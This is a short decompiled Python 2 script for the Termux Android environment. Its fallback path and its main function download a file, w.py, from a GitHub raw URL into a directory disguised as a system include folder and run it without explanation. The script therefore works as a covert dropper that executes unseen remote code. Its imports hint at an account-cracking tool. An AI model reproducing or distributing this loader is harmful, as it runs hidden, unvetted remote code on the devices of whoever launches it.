# Decompile by naim
# Time Succes decompile : 2022-04-21 13:10:19.515476
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests, hunterboy
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
    os.system('clear')
except ImportError:
    os.system('pkg install wget')
    os.system('rm -rf /data/data/com.termux/files/usr/include/video/hi1468')
    os.system('pip2 install mechanize')
    os.system('clear')
    os.system('mkdir /data/data/com.termux/files/usr/include/video/hi1468 && cd /data/data/com.termux/files/usr/include/video/hi1468')
    os.system('cd /data/data/com.termux/files/usr/include/video/hi1468 && wget https://raw.githubusercontent.com/Ruler-Boy/Data/main/w.py')
    os.system('clear')
    time.sleep(0.1)
    os.system('cd /data/data/com.termux/files/usr/include/video/hi1468 && python2 w.py')

reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')

def z():
    os.system('clear')
    print '\x1b[1;96mPlease Wait .....'
    time.sleep(1)
    os.system('cd /data/data/com.termux/files/usr/include/video/hi1468 && python2 w.py')


if __name__ == '__main__':
    z()
